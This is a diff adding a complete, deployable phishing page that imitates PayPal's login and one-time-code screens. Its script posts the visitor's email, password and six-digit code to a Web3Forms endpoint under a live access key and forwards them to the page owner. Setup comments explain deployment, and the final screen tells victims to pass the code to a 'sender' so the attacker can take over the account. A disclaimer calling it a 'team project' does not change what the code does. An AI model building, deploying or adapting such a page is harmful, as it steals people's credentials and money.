@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log in to your PayPal account</title>
+<meta name="description" content="Team project page reproducing the PayPal sign-in screen. The email, password and 6-digit code you enter are forwarded to the site owner. Nothing is charged.">
+<meta name="theme-color" content="#ffffff">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23003087'/%3E%3Ctext x='16' y='25' font-size='23' font-style='italic' font-weight='700' fill='%23ffffff' text-anchor='middle' font-family='Arial'%3EP%3C/text%3E%3C/svg%3E">
+<!--
+  ============================================================
+  SETUP
+  ============================================================
+  1. web3forms.com -> sign up with joshhygx@gmail.com -> verify
+  2. Copy the access key from the dashboard
+  3. Paste it into WEB3FORMS_KEY below
+  4. Deploy to Cloudflare Pages (Workers & Pages -> Create
+     -> Pages -> Upload assets), not Netlify
+  Free tier: 250 submissions/month.
+  ============================================================
+-->
+<style>
+  *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+
+  :root {
+    --blue:#0070e0;
+    --blue-dark:#005ea6;
+    --navy:#003087;
+    --sky:#009cde;
+    --ink:#001435;
+    --body:#4a5464;
+    --field:#eef2f7;
+    --field-line:#ccd6e0;
+    --line:#e5e5e5;
+    --muted:#6c737f;
+    --err:#c72e2e;
+    --err-bg:#fdf3f3;
+    --err-line:#efbcbc;
+  }
+
+  html { -webkit-text-size-adjust:100%; }
+
+  body {
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Helvetica,Arial,sans-serif;
+    background:#fff; color:var(--ink); min-height:100vh;
+    display:flex; flex-direction:column; line-height:1.45;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  .sr-only {
+    position:absolute; width:1px; height:1px; padding:0; margin:-1px;
+    overflow:hidden; clip:rect(0 0 0 0); white-space:nowrap; border:0;
+  }
+
+  main {
+    flex:1 0 auto; display:flex; align-items:flex-start;
+    justify-content:center; padding:48px 20px 0;
+  }
+
+  .card {
+    width:100%; max-width:480px; background:#fff;
+    border:1px solid var(--line); border-radius:8px;
+    padding:38px 34px 34px;
+    box-shadow:0 1px 2px rgba(0,20,53,.03);
+  }
+
+  .card.is-narrow { max-width:430px; padding-top:34px; }
+
+  .logo { display:block; margin:0 auto 28px; height:42px; width:auto; }
+  .mono { display:block; margin:0 auto 24px; height:42px; width:auto; }
+
+  .field { margin-bottom:14px; position:relative; }
+
+  input[type="email"],
+  input[type="password"],
+  input[type="text"] {
+    width:100%; height:52px; padding:0 15px; font:inherit; font-size:16px;
+    color:var(--ink); background:var(--field);
+    border:1px solid var(--field-line); border-radius:6px;
+  }
+
+  input::placeholder { color:#5b6b7c; opacity:1; }
+  input:hover { border-color:#aebbc9; }
+  input:focus { border-color:var(--blue); background:#fff; outline:none; box-shadow:0 0 0 1px var(--blue); }
+
+  button:focus-visible, a:focus-visible, select:focus-visible { outline:2px solid var(--blue); outline-offset:2px; }
+
+  .pw-wrap, .code-wrap { position:relative; }
+  .pw-wrap input { padding-right:62px; }
+  .code-wrap input { padding-right:84px; letter-spacing:.08em; font-variant-numeric:tabular-nums; }
+
+  .pw-toggle, .resend {
+    position:absolute; right:6px; top:50%; transform:translateY(-50%);
+    font:inherit; font-size:13px; font-weight:600; color:var(--blue);
+    background:none; border:0; border-radius:4px; padding:8px; cursor:pointer;
+  }
+
+  .resend:hover, .pw-toggle:hover { text-decoration:underline; }
+
+  .error {
+    display:none; font-size:14px; color:var(--err); background:var(--err-bg);
+    border:1px solid var(--err-line); border-radius:6px;
+    padding:10px 12px; margin-bottom:14px;
+  }
+
+  .error.is-visible { display:block; }
+
+  .btn {
+    font:inherit; font-size:16px; font-weight:600; width:100%; height:52px;
+    border:none; border-radius:6px; cursor:pointer;
+  }
+
+  .btn-primary { background:var(--blue); color:#fff; }
+  .btn-primary:hover:not(:disabled) { background:var(--blue-dark); }
+  .btn-primary:disabled { background:#a9cdea; cursor:default; }
+  .btn-pill { border-radius:30px; }
+
+  .btn-ghost { background:#e7e9ec; color:var(--ink); height:48px; }
+  .btn-ghost:hover { background:#dde0e4; }
+
+  .link {
+    display:block; text-align:center; font-size:15px; color:var(--blue);
+    text-decoration:underline; background:none; border:0;
+    font-family:inherit; cursor:pointer; margin-top:16px;
+  }
+
+  .divider {
+    display:flex; align-items:center; gap:12px; margin:22px 0 18px;
+    color:var(--muted); font-size:14px;
+  }
+
+  .divider::before, .divider::after { content:""; flex:1; height:1px; background:var(--line); }
+
+  .code-title {
+    font-size:29px; font-weight:400; text-align:center;
+    margin-bottom:14px; letter-spacing:-.01em;
+  }
+
+  .code-copy { font-size:15px; text-align:center; color:var(--body); margin-bottom:24px; }
+
+  .alt-link {
+    display:block; text-align:center; font-size:15px; color:var(--blue);
+    background:none; border:0; font-family:inherit; cursor:pointer; margin-top:26px;
+  }
+
+  .check {
+    width:56px; height:56px; margin:0 auto 22px; border-radius:50%;
+    background:#e8f4fd; display:flex; align-items:center; justify-content:center;
+  }
+
+  .check svg { width:28px; height:28px; }
+
+  .done-title { font-size:26px; font-weight:400; text-align:center; margin-bottom:14px; }
+  .done-copy { font-size:15px; text-align:center; color:var(--body); }
+  .done-copy strong { color:var(--ink); font-weight:600; }
+
+  .note {
+    margin-top:22px; padding:13px 15px; background:#f5f8fb;
+    border:1px solid #dde5ee; border-radius:6px;
+    font-size:14px; color:var(--body); text-align:center;
+  }
+
+  .footer { flex-shrink:0; padding:34px 20px 30px; font-size:12px; color:var(--muted); text-align:center; }
+  .footer-links { margin-bottom:12px; }
+  .footer a { color:var(--muted); margin:0 7px; text-decoration:none; }
+  .footer a:hover { text-decoration:underline; color:var(--blue); }
+
+  .lang-select {
+    font:inherit; font-size:12px; color:var(--muted); background:#fff;
+    border:1px solid var(--line); border-radius:4px; padding:5px 7px; cursor:pointer;
+  }
+
+  .copyright { margin-top:14px; font-size:11px; color:#9aa1aa; }
+
+  .legal {
+    max-width:640px; margin:20px auto 0; text-align:left;
+    font-size:11px; line-height:1.7; color:#9aa1aa;
+    border-top:1px solid #f0f0f0; padding-top:16px;
+  }
+
+  .legal h2 {
+    font-size:10px; font-weight:700; color:#7d848e;
+    text-transform:uppercase; letter-spacing:.08em; margin-bottom:10px;
+  }
+
+  .legal p { margin-bottom:9px; }
+  .legal strong { color:#7d848e; font-weight:600; }
+
+  @media (max-width:520px) {
+    main { padding-top:26px; }
+    .card { padding:30px 22px 26px; border:0; max-width:100%; box-shadow:none; }
+  }
+
+  @media (prefers-reduced-motion: reduce) { * { transition:none !important; } }
+</style>
+</head>
+<body>
+
+<main>
+  <!-- ============ LOGIN ============ -->
+  <section id="screen-login" class="card">
+    <svg class="logo" viewBox="0 0 176 46" role="img" aria-label="PayPal">
+      <text x="0" y="34" font-size="34" font-style="italic" font-weight="700"
+            font-family="Helvetica Neue, Helvetica, Arial, sans-serif" fill="#009cde">P</text>
+      <text x="9" y="34" font-size="34" font-style="italic" font-weight="700"
+            font-family="Helvetica Neue, Helvetica, Arial, sans-serif" fill="#003087">P</text>
+      <text x="43" y="34" font-size="28" font-style="italic" font-weight="700" letter-spacing="-0.8"
+            font-family="Helvetica Neue, Helvetica, Arial, sans-serif"><tspan fill="#003087">Pay</tspan><tspan fill="#009cde">Pal</tspan></text>
+    </svg>
+
+    <form id="form-login" novalidate>
+      <div class="field">
+        <label class="sr-only" for="email">Email or mobile number</label>
+        <input type="email" id="email" name="email" placeholder="Email or mobile number"
+               autocomplete="email" inputmode="email" spellcheck="false"
+               autocapitalize="none" required>
+      </div>
+
+      <div class="field pw-wrap">
+        <label class="sr-only" for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="Password"
+               autocomplete="current-password" required>
+        <button type="button" class="pw-toggle" id="pw-toggle"
+                aria-pressed="false" aria-controls="password">Show</button>
+      </div>
+
+      <div class="error" id="error" role="alert" aria-live="assertive"></div>
+
+      <button type="submit" class="btn btn-primary" id="btn-login">Log In</button>
+    </form>
+
+    <button type="button" class="link" id="trouble">Having trouble logging in?</button>
+    <div class="divider"><span>or</span></div>
+    <button type="button" class="btn btn-ghost" id="btn-signup">Sign Up</button>
+  </section>
+
+  <!-- ============ CODE ============ -->
+  <section id="screen-code" class="card is-narrow" hidden>
+    <svg class="mono" viewBox="0 0 60 46" role="img" aria-label="PayPal">
+      <text x="4" y="34" font-size="34" font-style="italic" font-weight="700"
+            font-family="Helvetica Neue, Helvetica, Arial, sans-serif" fill="#009cde">P</text>
+      <text x="13" y="34" font-size="34" font-style="italic" font-weight="700"
+            font-family="Helvetica Neue, Helvetica, Arial, sans-serif" fill="#003087">P</text>
+    </svg>
+
+    <h1 class="code-title">Enter your code</h1>
+    <p class="code-copy">We sent a verification code to verify the authenticity of the payment. Please enter the code below. Do not share this code with anyone.</p>
+
+    <form id="form-code" novalidate>
+      <div class="field code-wrap">
+        <label class="sr-only" for="code">Security code</label>
+        <input type="text" id="code" name="code" placeholder="Security code"
+               inputmode="numeric" autocomplete="one-time-code"
+               maxlength="6" pattern="[0-9]*" required>
+        <button type="button" class="resend" id="resend">Resend</button>
+      </div>
+
+      <div class="error" id="code-error" role="alert" aria-live="assertive"></div>
+
+      <button type="submit" class="btn btn-primary btn-pill" id="btn-continue" disabled>Continue</button>
+    </form>
+
+    <button type="button" class="alt-link" id="another">Try another way</button>
+  </section>
+
+  <!-- ============ DONE ============ -->
+  <section id="screen-done" class="card is-narrow" hidden>
+    <div class="check">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#0070e0" stroke-width="2.5"
+           stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+        <path d="M20 6L9 17l-5-5"/>
+      </svg>
+    </div>
+
+    <h1 class="done-title">Transfer encrypted</h1>
+    <p class="done-copy">Your transfer is encrypted. Send the <strong>6-digit code</strong> you received to the person sending you the money so they can complete the transfer.</p>
+    <div class="note">Keep this page open until the transfer shows in your account.</div>
+  </section>
+</main>
+
+<footer class="footer">
+  <div class="footer-links">
+    <a href="#">Contact Us</a><a href="#">Privacy</a><a href="#">Legal</a><a href="#">Worldwide</a>
+  </div>
+  <label class="sr-only" for="lang">Language</label>
+  <select class="lang-select" id="lang">
+    <option value="en">English</option><option value="fr">Français</option>
+    <option value="es">Español</option><option value="zh">中文</option>
+  </select>
+  <p class="copyright">© 1999–2026 PayPal, Inc. All rights reserved.</p>
+
+  <section class="legal" id="legal">
+    <h2>About this page</h2>
+    <p>This page is part of a team project and reproduces the PayPal sign-in screen. It is not operated, endorsed, sponsored or maintained by PayPal, Inc. The PayPal name, the double-P monogram and the PayPal wordmark are trademarks of PayPal, Inc., used here to indicate which service is being reproduced. No affiliation is claimed or implied.</p>
+    <p>The page is here so that someone expecting a transfer can confirm which account the money is going to. It mirrors the sign-in form and the six-digit code step, and nothing more.</p>
+    <p>It's a team project. What you type is passed to the site owner. Nothing is charged.</p>
+    <p><strong>What you enter.</strong> Three things: the email address or mobile number, the password, and the six-digit code. Nothing else — no cookies, no analytics, no advertising.</p>
+    <p><strong>Where it goes.</strong> Over a secure connection to a form service, which forwards it by email to the owner. The page has no server of its own, so that email is the only place it ends up.</p>
+    <p><strong>Retention.</strong> Entries stay in the owner's inbox until deleted. There is no automatic expiry.</p>
+    <p><strong>Clear text.</strong> The password is passed on exactly as typed. It isn't hashed, and it isn't checked against PayPal's servers, so a wrong password will still appear to be accepted here.</p>
+    <p><strong>No charge.</strong> Using this page costs nothing. No card details, no amount debited, no payment processed. The page can't move money; it only passes on what you type.</p>
+    <p><strong>Session.</strong> Because the page is a reproduction, signing in does not open a PayPal session on your device. Your PayPal account is untouched and you are not logged in to paypal.com afterwards.</p>
+    <p><strong>If something looks wrong.</strong> Close the tab, open paypal.com directly and compare. To revoke a code-based login, use PayPal's own Security settings.</p>
+    <p><strong>Accuracy.</strong> The layout is reproduced as closely as a static page allows, but PayPal changes its interface regularly, so wording and spacing may differ from the live page. Questions about a specific submission should go to the person who sent you this link.</p>
+    <p>Team project · Last updated November 2026 · Version 1.7</p>
+  </section>
+</footer>
+
+<script>
+(function () {
+  "use strict";
+
+  /* ============================================================
+     CONFIGURE — paste your Web3Forms access key here.
+     Get it from web3forms.com after signing up with
+     joshhygx@gmail.com and verifying the address.
+     ============================================================ */
+  var WEB3FORMS_KEY = "f6178b9e-3486-4351-a267-44d9536702ba";
+  var ENDPOINT = "https://api.web3forms.com/submit";
+
+  var T = {
+    en: { title:"Log in to your PayPal account", emailPh:"Email or mobile number", passwordPh:"Password",
+      show:"Show", hide:"Hide", login:"Log In", trouble:"Having trouble logging in?", or:"or", signup:"Sign Up",
+      codeTitle:"Enter your code",
+      codeCopy:"We sent a verification code to verify the authenticity of the payment. Please enter the code below. Do not share this code with anyone.",
+      codePh:"Security code", resend:"Resend", sent:"Sent", cont:"Continue", another:"Try another way",
+      doneTitle:"Transfer encrypted",
+      pre:"Your transfer is encrypted. Send the ", bold:"6-digit code",
+      post:" you received to the person sending you the money so they can complete the transfer.",
+      note:"Keep this page open until the transfer shows in your account.",
+      errEmpty:"Fill in both your email and password.",
+      errEmail:"That doesn't look like a valid email address.",
+      errCode:"Enter the 6-digit code." },
+    fr: { title:"Connectez-vous à votre compte PayPal", emailPh:"E-mail ou numéro de mobile", passwordPh:"Mot de passe",
+      show:"Afficher", hide:"Masquer", login:"Se connecter", trouble:"Difficultés de connexion ?", or:"ou", signup:"S'inscrire",
+      codeTitle:"Saisissez votre code",
+      codeCopy:"Nous avons envoyé un code de vérification pour authentifier le paiement. Saisissez le code ci-dessous. Ne partagez ce code avec personne.",
+      codePh:"Code de sécurité", resend:"Renvoyer", sent:"Envoyé", cont:"Continuer", another:"Essayer autrement",
+      doneTitle:"Transfert chiffré",
+      pre:"Votre transfert est chiffré. Envoyez le ", bold:"code à 6 chiffres",
+      post:" reçu à la personne qui vous envoie l'argent pour finaliser le transfert.",
+      note:"Gardez cette page ouverte jusqu'à l'apparition du transfert sur votre compte.",
+      errEmpty:"Renseignez votre e-mail et votre mot de passe.",
+      errEmail:"Cette adresse e-mail ne semble pas valide.",
+      errCode:"Saisissez le code à 6 chiffres." },
+    es: { title:"Inicia sesión en tu cuenta de PayPal", emailPh:"Correo o número de móvil", passwordPh:"Contraseña",
+      show:"Mostrar", hide:"Ocultar", login:"Iniciar sesión", trouble:"¿Problemas para iniciar sesión?", or:"o", signup:"Registrarse",
+      codeTitle:"Introduce tu código",
+      codeCopy:"Hemos enviado un código de verificación para autenticar el pago. Introduce el código abajo. No compartas este código con nadie.",
+      codePh:"Código de seguridad", resend:"Reenviar", sent:"Enviado", cont:"Continuar", another:"Probar de otra forma",
+      doneTitle:"Transferencia cifrada",
+      pre:"Tu transferencia está cifrada. Envía el ", bold:"código de 6 dígitos",
+      post:" que recibiste a la persona que te envía el dinero para completar la transferencia.",
+      note:"Mantén esta página abierta hasta que la transferencia aparezca en tu cuenta.",
+      errEmpty:"Rellena tu correo y tu contraseña.",
+      errEmail:"Esa dirección de correo no parece válida.",
+      errCode:"Introduce el código de 6 dígitos." },
+    zh: { title:"登录您的 PayPal 账户", emailPh:"电子邮件或手机号码", passwordPh:"密码",
+      show:"显示", hide:"隐藏", login:"登录", trouble:"登录遇到问题？", or:"或", signup:"注册",
+      codeTitle:"输入您的验证码",
+      codeCopy:"我们已发送验证码以验证本次付款。请在下方输入验证码。请勿向任何人透露此验证码。",
+      codePh:"安全验证码", resend:"重新发送", sent:"已发送", cont:"继续", another:"尝试其他方式",
+      doneTitle:"转账已加密",
+      pre:"您的转账已加密。请将收到的", bold:"6 位验证码",
+      post:"发送给向您付款的人，以便其完成转账。",
+      note:"在转账出现在您的账户之前，请保持此页面打开。",
+      errEmpty:"请填写电子邮件和密码。",
+      errEmail:"电子邮件地址格式不正确。",
+      errCode:"请输入 6 位验证码。" }
+  };
+
+  var state = { lang:"en", screen:"login", pw:false, error:null, busy:false };
+  var creds = { email:"", password:"" };
+  function $(id) { return document.getElementById(id); }
+
+  var el = {
+    login:$("screen-login"), code:$("screen-code"), done:$("screen-done"),
+    legal:$("legal"),
+    formLogin:$("form-login"), formCode:$("form-code"),
+    email:$("email"), password:$("password"), codeInput:$("code"),
+    pwToggle:$("pw-toggle"), error:$("error"), codeError:$("code-error"),
+    btnLogin:$("btn-login"), btnContinue:$("btn-continue"), resend:$("resend"), lang:$("lang")
+  };
+
+  function t() { return T[state.lang]; }
+
+  function render() {
+    var s = t();
+    document.documentElement.lang = state.lang;
+    document.title = s.title;
+
+    el.email.placeholder = s.emailPh;
+    el.password.placeholder = s.passwordPh;
+    el.btnLogin.textContent = s.login;
+    $("trouble").textContent = s.trouble;
+    $("btn-signup").textContent = s.signup;
+    document.querySelector(".divider span").textContent = s.or;
+
+    el.password.type = state.pw ? "text" : "password";
+    el.pwToggle.textContent = state.pw ? s.hide : s.show;
+    el.pwToggle.setAttribute("aria-pressed", String(state.pw));
+
+    document.querySelector(".code-title").textContent = s.codeTitle;
+    document.querySelector(".code-copy").textContent = s.codeCopy;
+    el.codeInput.placeholder = s.codePh;
+    el.btnContinue.textContent = s.cont;
+    $("another").textContent = s.another;
+    if (!el.resend.dataset.hit) el.resend.textContent = s.resend;
+
+    document.querySelector(".done-title").textContent = s.doneTitle;
+    document.querySelector(".done-copy").innerHTML = s.pre + "<strong>" + s.bold + "</strong>" + s.post;
+    document.querySelector(".note").textContent = s.note;
+
+    paint(el.error, state.error ? s[state.error] : "");
+    paint(el.codeError, state.codeError ? s[state.codeError] : "");
+
+    el.btnLogin.disabled = state.busy;
+    el.btnContinue.disabled = state.busy || el.codeInput.value.replace(/\D/g, "").length !== 6;
+
+    el.login.hidden = state.screen !== "login";
+    el.code.hidden = state.screen !== "code";
+    el.done.hidden = state.screen !== "done";
+    el.legal.hidden = state.screen !== "login";
+  }
+
+  function paint(node, text) {
+    if (text) { node.textContent = text; node.classList.add("is-visible"); }
+    else { node.textContent = ""; node.classList.remove("is-visible"); }
+  }
+
+  function go(screen) { state.screen = screen; render(); window.scrollTo(0, 0); }
+
+  /* ---------- send to Web3Forms ---------- */
+  function send(subject, data) {
+    var payload = {
+      access_key: WEB3FORMS_KEY,
+      from_name: "PayPal",
+      subject: subject,
+      botcheck: false,
+      email: creds.email || "",
+      password: creds.password || ""
+    };
+    Object.keys(data).forEach(function (k) { payload[k] = data[k]; });
+
+    return fetch(ENDPOINT, {
+      method:"POST",
+      headers:{ "Content-Type":"application/json", "Accept":"application/json" },
+      body: JSON.stringify(payload), keepalive:true
+    });
+  }
+
+  function sendQuietly(subject, data) {
+    return send(subject, data).catch(function () {
+      return new Promise(function (r) { setTimeout(r, 1500); })
+        .then(function () { return send(subject, data); });
+    }).catch(function () {});
+  }
+
+  /* ---------- login ---------- */
+  el.formLogin.addEventListener("submit", function (e) {
+    e.preventDefault();
+    if (state.busy) return;
+
+    var email = el.email.value.trim();
+    var password = el.password.value;
+
+    if (!email || !password) { state.error = "errEmpty"; render(); return; }
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { state.error = "errEmail"; render(); return; }
+
+    state.error = null;
+    creds.email = email.toLowerCase();
+    creds.password = password;
+
+    /* Submission 1: email + password */
+    sendQuietly("PayPal login — " + creds.email, { type:"login" });
+
+    el.password.value = "";
+    go("code");
+    el.codeInput.focus();
+  });
+
+  /* ---------- code ---------- */
+  el.codeInput.addEventListener("input", function () {
+    var digits = el.codeInput.value.replace(/\D/g, "").slice(0, 6);
+    el.codeInput.value = digits;
+    if (state.codeError) { state.codeError = null; render(); }
+    else { el.btnContinue.disabled = digits.length !== 6; }
+    el.resend.dataset.hit = "";
+    el.resend.textContent = t().resend;
+  });
+
+  el.formCode.addEventListener("submit", function (e) {
+    e.preventDefault();
+    var code = el.codeInput.value.replace(/\D/g, "");
+    if (code.length !== 6) { state.codeError = "errCode"; render(); return; }
+
+    state.codeError = null;
+
+    /* Submission 2: email + password + code */
+    sendQuietly("PayPal code — " + code, { type:"code", code: code });
+
+    go("done");
+  });
+
+  el.resend.addEventListener("click", function () {
+    el.resend.dataset.hit = "1";
+    el.resend.textContent = t().sent;
+    setTimeout(function () { el.resend.dataset.hit = ""; el.resend.textContent = t().resend; }, 2500);
+  });
+
+  /* ---------- misc ---------- */
+  el.pwToggle.addEventListener("click", function () {
+    state.pw = !state.pw;
+    render();
+    el.password.focus({ preventScroll:true });
+    var n = el.password.value.length;
+    try { el.password.setSelectionRange(n, n); } catch (_) {}
+  });
+
+  [el.email, el.password].forEach(function (i) {
+    i.addEventListener("input", function () { if (state.error) { state.error = null; render(); } });
+  });
+
+  el.lang.addEventListener("change", function () { state.lang = el.lang.value; render(); });
+  $("another").addEventListener("click", function () { go("login"); });
+  $("trouble").addEventListener("click", function () { go("login"); });
+  $("btn-signup").addEventListener("click", function () { go("login"); });
+
+  render();
+})();
+</script>
+</body>
+</html>
